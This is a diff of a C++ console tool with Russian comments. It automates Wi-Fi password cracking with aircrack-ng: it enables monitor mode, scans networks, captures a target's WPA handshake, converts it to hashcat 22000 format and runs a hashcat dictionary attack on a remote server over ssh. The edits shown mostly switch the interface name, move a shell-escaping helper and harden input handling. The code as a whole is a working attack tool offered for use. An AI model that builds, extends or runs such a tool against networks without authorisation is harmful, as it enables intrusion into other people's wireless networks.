@@ -42,6 +42,22 @@ const std::string UNDERLINE = "\033[4m";
 #include <vector>
 #include <string>
 
+// Экранирование спецсимволов для защиты от инъекций
+std::string shellEscape(const std::string& arg) {
+    std::string escaped;
+    escaped += '\'';
+    for (char c : arg) {
+        if (c == '\'') {
+            escaped += "'\\''";  // экранируем одинарную кавычку
+        } else {
+            escaped += c;
+        }
+    }
+    escaped += '\'';
+    return escaped;
+}
+
+
 class TimedCommandReader {
 private:
     int pipe_fd;
@@ -136,13 +152,18 @@ std::vector<std::vector<std::string>> readCSV(const std::string& filename) {
 
 
 void signalHandler(int signum) {
-    std::cout << "\n\n[!]Останавливаем мониторинг..." << std::endl;
-    std::system("sudo airmon-ng stop wlan0mon");
+    std::cout << "\n\n[!] Останавливаем мониторинг..." << std::endl;
+    std::system("sudo airmon-ng stop wlp0s20f3mon");
     std::system("sudo systemctl restart NetworkManager");
     std::cout << "[+] Настройки восстановлены. Выход." << std::endl;
+    
+    // Очищаем состояние cin
+    std::cin.clear();
+    // Игнорируем оставшиеся символы
+    std::cin.ignore(10000, '\n');
+    
     exit(0);
 }
-
 std::string resolvePathStrict(const std::string& path) {
     if (path.empty()) return "";
     
@@ -214,16 +235,25 @@ std::string getFreeFilename(const std::string& base_name) {
 
 void check_wifi(std::string& out_bssid, std::string& out_channel, std::string& target_name) {
     std::string file_prefix = getFreeFilename("scan_result");
-    std::system("sudo airmon-ng check kill");
-    std::system("sudo airmon-ng start wlan0"); 
     
-    std::string command = "sudo airodump-ng wlan0mon --write " + file_prefix + 
+    // Останавливаем старый интерфейс и мешающие процессы
+    std::system("sudo airmon-ng stop wlp0s20f3mon 2>/dev/null");
+    std::system("sudo airmon-ng check kill");
+    std::system("sudo airmon-ng start wlp0s20f3");
+    
+    // Даём время на создание интерфейса
+    std::this_thread::sleep_for(std::chrono::seconds(2));
+    
+    std::string command = "sudo airodump-ng wlp0s20f3mon --write " + file_prefix + 
                       " --output-format csv --write-interval 1";
     
     TimedCommandReader reader(command);
     std::cout << "Сканирование сетей..." << std::endl;
-    printBar(15);
+    printBar(30);  // Увеличил до 30 секунд
     reader.stopAndRead();
+    
+    // Даём время на запись файла
+    std::this_thread::sleep_for(std::chrono::seconds(1));
     
     std::string csv_path = file_prefix + "-01.csv";
     auto networks = readCSV(csv_path);
@@ -248,16 +278,15 @@ void check_wifi(std::string& out_bssid, std::string& out_channel, std::string& t
     if (!found) {
         std::cout << "Сеть с таким названием не найдена. Доступные сети:" << std::endl;
         for (const auto& net : networks) {
-            std::cout << " - " << net[13] << std::endl;
+            if (net.size() > 13 && !net[13].empty()) {
+                std::cout << " - " << net[13] << std::endl;
+            }
         }
         out_bssid = "";
         out_channel = "";
     }
     
-    std::system("sudo airmon-ng stop wlan0mon");
-    std::system("sudo systemctl restart NetworkManager");
 }
-
 
 //сохраняем путь в которых хранится файл, так же делаем переменную target_name глобальной поскольку она сохраняет имя файла
 
@@ -291,23 +320,19 @@ void capture_wpa_handshake() {
     std::cout << "\n[!] Нажмите Ctrl+C, когда handshake будет пойман" << std::endl;
     std::cout << "[!] Или подождите, пока клиент подключится к сети\n" << std::endl;
     
-    std::system("sudo airmon-ng check kill");
-    std::cout << "Включаем режим мониторинга" << std::endl;
-    printBar(10);
-    std::system("sudo airmon-ng start wlan0");
-    
+
     std::cout << "Включаем режим тру хацкера и ждём пока кто-нибудь подключится: " << std::endl;
     printBar(15);
     
     // Запускаем захват
     std::string commands = "sudo airodump-ng -c " + Number_chanel + 
                       " --bssid " + shellEscape(BSSID) + 
-                      " -w " + shellEscape(handshake_dir + "/" + target_name) + " wlan0mon";
+                      " -w " + shellEscape(handshake_dir + "/" + target_name) + " wlp0s20f3mon";
     std::system(commands.c_str());
 }
 
 void convert_to_22000() {
-    std::system("sudo airmon-ng stop wlan0mon");
+    std::system("sudo airmon-ng stop wlp0s20f3mon");
     std::system("sudo systemctl restart NetworkManager");
     
     // Константный путь к папке с хэшами
@@ -339,20 +364,6 @@ void convert_to_22000() {
     } else {
         std::cout << Red << "Ошибка при конвертации. Проверьте путь к файлу." << white << std::endl;
     }
-}
-// Экранирование спецсимволов для защиты от инъекций
-std::string shellEscape(const std::string& arg) {
-    std::string escaped;
-    escaped += '\'';
-    for (char c : arg) {
-        if (c == '\'') {
-            escaped += "'\\''";  // экранируем одинарную кавычку
-        } else {
-            escaped += c;
-        }
-    }
-    escaped += '\'';
-    return escaped;
 }
 
 // Проверка имени файла (только буквы, цифры, точки, дефисы, подчёркивания)
@@ -487,11 +498,11 @@ void decrypt_wpa() {
         }
         
         // Формируем команду для выполнения на сервере
-        std::string remote_cmd = "cd " + put_na_servac + 
+        std::string remote_cmd = "cd " + shellEscape(put_na_servac) + 
                                 " && unzip -p " + shellEscape(server_dict_path) + 
                                 " | hashcat -m 22000 -a 0 " + shellEscape(file_name + ".22000") + 
-                                " -O -w 3 -d 1";
-        
+                                        " -O -w 3 -d 1";
+                
         // Запускаем расшифровку на сервере
         std::string ssh_cmd = "ssh -p " + port + " " + shellEscape(name_plus_ip_ssh) + 
                              " " + shellEscape(remote_cmd);
@@ -526,18 +537,28 @@ void Deistvie(int dei){
 }
 }
 int main() {
-     std::signal(SIGINT, signalHandler);
-    std::cout << Green << "=============================================" << white << std::endl; 
-    std::cout << Red << "выбирите действие: " << white << std::endl;
-    std::cout << blue << "1 перехватить пакет" << white << std::endl;
-    std::cout << blue << "2 перевести в нужный формат для hashcat" << white << std::endl;
-    std::cout << CYAN << "3 отправить на сервер и начать подбор"<< RESET << std::endl;
-    std::cout << Green << "=============================================" << white << std::endl;
-    int deistvie;
+    std::signal(SIGINT, signalHandler);
+    
     while (true) {
-    std::printf("пожалуйста введите номер действия");
-    std::cin>>deistvie;
-    Deistvie(deistvie);
+        std::cout << Green << "=============================================" << white << std::endl; 
+        std::cout << Red << "выберите действие: " << white << std::endl;
+        std::cout << blue << "1 перехватить пакет" << white << std::endl;
+        std::cout << blue << "2 перевести в нужный формат для hashcat" << white << std::endl;
+        std::cout << CYAN << "3 отправить на сервер и начать подбор"<< RESET << std::endl;
+        std::cout << Green << "=============================================" << white << std::endl;
+        
+        int deistvie;
+        std::cout << "пожалуйста введите номер действия: ";
+        
+        if (std::cin >> deistvie) {
+            Deistvie(deistvie);
+        } else {
+            // Если ввод не удался (например, Ctrl+D или ошибка)
+            std::cin.clear();  
+            std::cin.ignore(10000, '\n');  
+            std::cout << Red << "Ошибка ввода! Введите число." << RESET << std::endl;
+        }
     }
+    
     return 0;
 }
